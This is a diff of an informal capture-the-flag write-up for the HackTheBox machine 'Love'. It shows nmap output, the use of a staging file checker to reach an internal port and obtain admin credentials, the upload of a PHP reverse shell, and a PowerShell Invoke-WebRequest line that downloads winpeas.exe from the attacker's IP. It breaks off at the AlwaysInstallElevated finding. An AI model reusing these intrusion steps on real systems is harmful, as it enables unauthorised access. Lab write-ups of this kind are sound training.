@@ -1,66 +1,61 @@
+#Love
+
 #### NMAP 
 
-PORT     STATE SERVICE      VERSION
-80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not set
-|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
-|_http-title: Voting System using PHP
-135/tcp  open  msrpc        Microsoft Windows RPC
-139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
-443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
-|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
-|_http-title: 403 Forbidden
-| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
-| Not valid before: 2021-01-18T14:00:16
-|_Not valid after:  2022-01-18T14:00:16
-|_ssl-date: TLS randomness does not represent time
-| tls-alpn: 
-|_  http/1.1
-445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
-3306/tcp open  mysql?
-| fingerprint-strings: 
-|   DNSStatusRequestTCP, FourOhFourRequest, GenericLines, JavaRMI, LANDesk-RC, LDAPBindReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
-|_    Host '10.10.14.172' is not allowed to connect to this MariaDB server
-5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
-|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
-|_http-title: 403 Forbidden
+    PORT     STATE SERVICE      VERSION
+    80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+    | http-cookie-flags: 
+    |   /: 
+    |     PHPSESSID: 
+    |_      httponly flag not set
+    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+    |_http-title: Voting System using PHP
+    135/  tcp  open  msrpc        Microsoft Windows RPC
+    139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+    443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+    |_http-title: 403 Forbidden
+    | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
+    | Not valid before: 2021-01-18T14:00:16
+    |_Not valid after:  2022-01-18T14:00:16
+    |_ssl-date: TLS randomness does not represent time
+    | tls-alpn: 
+    |_  http/1.1
+    445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
+    3306/tcp open  mysql?
+    | fingerprint-strings: 
+    |   DNSStatusRequestTCP, FourOhFourRequest, GenericLines, JavaRMI, LANDesk-RC, LDAPBindReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SSLSessionReq,         TerminalServer, TerminalServerCookie, X11Probe: 
+    |_    Host '10.10.14.172' is not allowed to connect to this MariaDB server
+    5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+    |_http-title: 403 Forbidden
 
-
-https not working
-
-HTTP
 
 love.htb = voting system
+
 staging.love.htb = secucre file cecker
 
-open staging.love.htb we have option to enter url lets tried with reverse shell but not working
-next
-we got 5000(unusual-tcp port) lets try with this http://127.0.0.1:5000 its works we got voting systems admin crends
-after logged in there file upload place with this yes reverse shell..........
-dont go with usual linux rev shell try windows rev shell find github
+open staging.love.htb we have option to enter url tried with reverse shell but not working
+
+we got 5000(unusual-tcp port) lets try with this http://127.0.0.1:5000 its works we got voting systems admin credentials. After logged in there is file upload functionality with this yes reverse shell..........
+
+Windows revsershell
 https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/minified/php_reverse_shell_mini.php 
 
 reverse shell boom....
 
 lets open find user.txt
 
-powershell
-dir && cd users && cd Desktop && cat user.tx
+    powershell
+    dir && cd users && cd Desktop && cat user.tx
 
-privsec
+## privsec
 
 Transfer winpeas local machine to box 
+    
+    Invoke-WebRequest http://10.10.14.172:8000/winpeas.exe -OutFile winpeas.exe
 
-in windows Invoke-WebRequest this cmd works as like as inux wget
-
-Invoke-WebRequest http://10.10.14.172:8000/winpeas.exe -OutFile winpeas.exe
-
-After runing winpeas 
-
-we got AlwaysInstallElevated its enabled?
+After runing winpeas we got result that AlwaysInstallElevated its enabled?
 
 What is this? AlwaysInstallElevated?
 
